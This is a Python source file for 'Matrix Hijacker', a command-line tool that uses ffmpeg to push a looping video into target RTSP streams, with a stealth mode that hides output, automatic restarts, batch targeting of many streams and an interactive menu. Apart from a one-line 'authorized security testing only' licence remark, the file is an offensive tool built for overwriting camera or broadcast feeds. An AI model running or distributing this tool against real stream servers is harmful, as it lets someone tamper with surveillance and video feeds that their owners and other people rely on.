#!/usr/bin/env python3
"""
MATRIX HIJACKER  - Advanced RTSP Stream Hijacking
Professional Video Stream Injection & Overwrite Engine

Copyright (c) 2024 F1REW0LF
License: MIT - For authorized security testing only
"""

import sys
import os
import subprocess
import threading
import time
import json
import signal
import socket
import re
from datetime import datetime
from typing import Optional, Dict, List

# ==================== COLOR CODES ====================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

# ==================== LOGGER ====================
class Logger:
    def __init__(self, log_file="hijack.log"):
        self.log_file = log_file
        
    def log(self, event_type: str, message: str, data: Dict = None):
        entry = {
            'timestamp': datetime.now().isoformat(),
            'type': event_type,
            'message': message,
            'data': data or {}
        }
        with open(self.log_file, 'a') as f:
            f.write(json.dumps(entry) + '\n')

# ==================== RTSP INJECTOR ====================
class RTSPInjector:
    """RTSP stream injector with ffmpeg"""
    
    def __init__(self, stealth_mode: bool = True):
        self.stealth_mode = stealth_mode
        self.processes = {}
        self.logger = Logger()
        self.running = True
        self.stream_stats = {}
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        self._check_dependencies()
    
    def _check_dependencies(self):
        """Check required dependencies"""
        try:
            subprocess.run(["ffmpeg", "-version"], capture_output=True, check=True)
            cprint("[+] FFmpeg found", Colors.GREEN)
        except:
            cprint("[-] FFmpeg not installed. Install: apt-get install ffmpeg", Colors.RED)
            sys.exit(1)
    
    def signal_handler(self, signum, frame):
        """Handle signals"""
        cprint("\n[!] Shutting down RTSP injector...", Colors.YELLOW)
        self.running = False
        self.stop_all_streams()
        sys.exit(0)
    
    def validate_rtsp_url(self, url: str) -> bool:
        """Validate RTSP URL format"""
        # Basic RTSP URL validation
        pattern = r'^rtsp://[a-zA-Z0-9\-\.]+(:\d+)?(/.*)?$'
        return re.match(pattern, url) is not None
    
    def inject_stream(self, target_rtsp: str, video_file: str, loop: bool = True) -> Optional[subprocess.Popen]:
        """Inject custom video into RTSP stream"""
        if not self.validate_rtsp_url(target_rtsp):
            cprint(f"[-] Invalid RTSP URL: {target_rtsp}", Colors.RED)
            return None
        
        if not os.path.exists(video_file):
            cprint(f"[-] Video file not found: {video_file}", Colors.RED)
            return None
        
        cprint(f"\n[*] Injecting stream to: {target_rtsp}", Colors.YELLOW)
        cprint(f"[*] Source video: {video_file}", Colors.DIM)
        
        # Build ffmpeg command
        command = [
            'ffmpeg',
            '-re',                          # Read in real-time
            '-i', video_file,               # Input file
            '-c', 'copy',                   # Copy codec
            '-f', 'rtsp',                   # RTSP output
            '-rtsp_transport', 'tcp',       # TCP transport
            '-muxdelay', '0.1',             # Minimal delay
        ]
        
        # Add looping if requested
        if loop:
            command.extend(['-stream_loop', '-1'])
        
        # Add stealth options
        if self.stealth_mode:
            command.extend([
                '-loglevel', 'error',        # Suppress output
                '-hide_banner'              # Hide banner
            ])
        
        command.append(target_rtsp)
        
        try:
            # Start ffmpeg process
            if self.stealth_mode:
                process = subprocess.Popen(
                    command,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            else:
                process = subprocess.Popen(command)
            
            # Store process
            self.processes[target_rtsp] = {
                'process': process,
                'video_file': video_file,
                'start_time': time.time(),
                'pid': process.pid
            }
            
            self.stream_stats[target_rtsp] = {
                'status': 'running',
                'pid': process.pid,
                'started': datetime.now().isoformat(),
                'video': video_file
            }
            
            cprint(f"[+] Stream injection started (PID: {process.pid})", Colors.GREEN)
            
            self.logger.log(
                'injection_started',
                f"RTSP injection started for {target_rtsp}",
                {'pid': process.pid, 'video': video_file}
            )
            
            # Monitor process in background
            threading.Thread(
                target=self._monitor_process,
                args=(target_rtsp, process),
                daemon=True
            ).start()
            
            return process
            
        except Exception as e:
            cprint(f"[-] Injection failed: {e}", Colors.RED)
            self.logger.log('injection_failed', str(e), {'target': target_rtsp})
            return None
    
    def _monitor_process(self, target_rtsp: str, process: subprocess.Popen):
        """Monitor ffmpeg process status"""
        while self.running and process.poll() is None:
            time.sleep(1)
        
        if process.poll() is not None:
            cprint(f"[!] Stream to {target_rtsp} stopped (exit code: {process.returncode})", Colors.YELLOW)
            
            if target_rtsp in self.processes:
                self.processes[target_rtsp]['status'] = 'stopped'
                self.stream_stats[target_rtsp]['status'] = 'stopped'
                self.stream_stats[target_rtsp]['exit_code'] = process.returncode
            
            # Auto-restart if needed
            if self.running and process.returncode != 0:
                cprint("[*] Attempting to restart stream...", Colors.DIM)
                self.restart_stream(target_rtsp)
    
    def restart_stream(self, target_rtsp: str):
        """Restart a stopped stream"""
        if target_rtsp not in self.processes:
            cprint(f"[-] No stream found for {target_rtsp}", Colors.RED)
            return
        
        video_file = self.processes[target_rtsp]['video_file']
        
        # Stop existing process
        self.stop_stream(target_rtsp)
        
        # Restart
        time.sleep(1)
        self.inject_stream(target_rtsp, video_file)
    
    def stop_stream(self, target_rtsp: str):
        """Stop a specific stream"""
        if target_rtsp not in self.processes:
            cprint(f"[-] No stream found for {target_rtsp}", Colors.RED)
            return
        
        process = self.processes[target_rtsp]['process']
        
        try:
            process.terminate()
            process.wait(timeout=5)
            cprint(f"[+] Stream stopped: {target_rtsp}", Colors.GREEN)
        except subprocess.TimeoutExpired:
            process.kill()
            cprint(f"[+] Stream killed: {target_rtsp}", Colors.YELLOW)
        except Exception as e:
            cprint(f"[-] Error stopping stream: {e}", Colors.RED)
        
        # Clean up
        del self.processes[target_rtsp]
        if target_rtsp in self.stream_stats:
            self.stream_stats[target_rtsp]['status'] = 'stopped'
        
        self.logger.log(
            'stream_stopped',
            f"RTSP stream stopped: {target_rtsp}",
            {}
        )
    
    def stop_all_streams(self):
        """Stop all active streams"""
        cprint("[*] Stopping all streams...", Colors.YELLOW)
        
        for target_rtsp in list(self.processes.keys()):
            self.stop_stream(target_rtsp)
        
        cprint("[+] All streams stopped", Colors.GREEN)
    
    def get_status(self) -> Dict:
        """Get status of all streams"""
        status = {
            'active_streams': len(self.processes),
            'streams': self.stream_stats,
            'uptime': time.time() - self.processes.get('start_time', time.time())
        }
        return status
    
    def list_streams(self):
        """List all active streams"""
        if not self.processes:
            cprint("[!] No active streams", Colors.YELLOW)
            return
        
        cprint("\n[*] Active RTSP Streams:", Colors.CYAN)
        print("-" * 60)
        
        for idx, (target, info) in enumerate(self.processes.items(), 1):
            uptime = int(time.time() - info['start_time'])
            status = info.get('status', 'running')
            
            cprint(f"  {idx}. Target: {target}", Colors.WHITE)
            cprint(f"     Video: {info['video_file']}", Colors.DIM)
            cprint(f"     PID: {info['pid']} | Uptime: {uptime}s | Status: {status}", Colors.DIM)
            print()
    
    def batch_inject(self, targets: List[Dict]):
        """Inject multiple streams from a list"""
        cprint(f"[*] Starting batch injection for {len(targets)} streams", Colors.YELLOW)
        
        for target in targets:
            if 'url' in target and 'video' in target:
                self.inject_stream(target['url'], target['video'])
                time.sleep(1)  # Cooldown between injections
        
        cprint(f"[+] Batch injection complete", Colors.GREEN)

# ==================== MAIN ====================
def main():
    """Main entry point with CLI"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Matrix Hijacker v2.0")
    parser.add_argument("-t", "--target", help="Target RTSP URL")
    parser.add_argument("-v", "--video", help="Video file path")
    parser.add_argument("-b", "--batch", help="Batch config file (JSON)")
    parser.add_argument("-s", "--stealth", action="store_true", help="Stealth mode")
    parser.add_argument("-l", "--list", action="store_true", help="List active streams")
    parser.add_argument("--stop-all", action="store_true", help="Stop all streams")
    
    args = parser.parse_args()
    
    injector = RTSPInjector(stealth_mode=args.stealth)
    
    # Show banner
    print("="*60)
    cprint(" MATRIX HIJACKER v2.0", Colors.PURPLE, bold=True)
    cprint(" RTSP Stream Injection Engine", Colors.CYAN)
    print("="*60)
    
    # Handle commands
    if args.stop_all:
        injector.stop_all_streams()
        return
    
    if args.list:
        injector.list_streams()
        return
    
    if args.batch:
        try:
            with open(args.batch, 'r') as f:
                targets = json.load(f)
            injector.batch_inject(targets)
        except Exception as e:
            cprint(f"[-] Failed to load batch file: {e}", Colors.RED)
        return
    
    if args.target and args.video:
        injector.inject_stream(args.target, args.video)
        
        # Keep running
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            injector.stop_all_streams()
    else:
        # Interactive mode
        while True:
            print("\n" + "-"*60)
            cprint("[MATRIX HIJACKER MENU]", Colors.BLUE, bold=True)
            print("1. Inject Single Stream")
            print("2. List Active Streams")
            print("3. Stop All Streams")
            print("4. Exit")
            
            choice = input("\n[>] Selection: ").strip()
            
            if choice == '1':
                target = input("[>] RTSP URL: ").strip()
                video = input("[>] Video File: ").strip()
                injector.inject_stream(target, video)
            elif choice == '2':
                injector.list_streams()
            elif choice == '3':
                injector.stop_all_streams()
            elif choice == '4':
                injector.stop_all_streams()
                cprint("[*] Exiting...", Colors.GREEN)
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)

if __name__ == "__main__":
    main()
